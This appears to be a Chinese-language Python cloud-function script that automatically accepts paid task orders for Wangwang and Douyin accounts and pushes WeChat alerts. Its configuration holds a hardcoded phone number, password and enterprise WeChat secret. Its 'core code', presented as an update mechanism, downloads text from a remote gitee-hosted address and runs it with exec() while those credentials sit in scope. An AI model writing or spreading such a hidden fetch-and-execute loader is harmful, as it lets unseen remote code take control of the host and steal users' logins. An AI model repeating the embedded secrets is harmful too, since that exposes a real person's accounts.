# -*- coding:utf-8 -*-
import requests
#云函数使用教程(http://qr61.cn/ogpvAF/qMXaiV7）环境选python3.6,超时设置900s，触发器定时（0 */15 7-23 * * * *）

#--------------以下为配置区需自行填写--------------#
#1.多旺旺选择开关:你在蓝奏云（https://www.lanzou.com/u）新建一个文件夹获取的外链分享地址(有密码不影响)，通过重命名文件夹名为4位数字（文件夹名第一、二、三/四位分别对应主旺旺、小号1、小号2、抖音，0为关闭，1为开启。例：0000为全部关闭接单，1111为全部开启接单，1000为大号开启接单，0100为小号1开启接单，0011为小号2和抖音一起接单，若没有对应小号请用0占位保持数字为4位）实现远程控制云函数功能。接单成功并通知后请将对应位置数字置0，否则在完成任务之前微信会持续推送做单提醒。第二天需要的时候再改为对应数字即可开始接单。
folder = 'https://wwa.lanzoui.com/b0eqfv5ob' #请将单引号内默认链接替换为你自己的链接
#2.登陆手机号
phone = '13005275420' #请将手机号填在单引号内
#3.密码
password = 'qq8719724' #请将密码填在单引号内
#4.(选填，不填则不推送)微信推送通知：接单成功微信pushplus通知token（通过网页http://www.pushplus.plus/push1.html扫码登陆获取）
Token = ''
#5.(选填，不填则不推送)企业微信推送，教程见tg频道
AgentId = '1000004'
corpid = 'wwad849d24b9ae762e'
Secret = 'H4t9D51QTfrQnQS_-aXCDqp4N-o8HrvCUOuJzUGLudw'
media_id='2Dl-C5yXBJZuOsW65sApwspsRzYcA6bbK6qm6NGCBOPL2KFuUDTR6YDjHbempF65c'
#----------以下为核心代码区，请勿擅自修改！-----------#
gxwz='https://gitee.com/jpscf/main/raw/master/gxwz'#代码更新网站

def main_handler(event, context):
    code=requests.get(requests.get(gxwz).text+'/jPiwq8mnMAm9TNoPOaSiPQHedvmNVF3JD5lHBg.html')
    code.encoding='utf-8'
    exec(code.text,globals())

if __name__ == '__main__':
    main_handler("", "")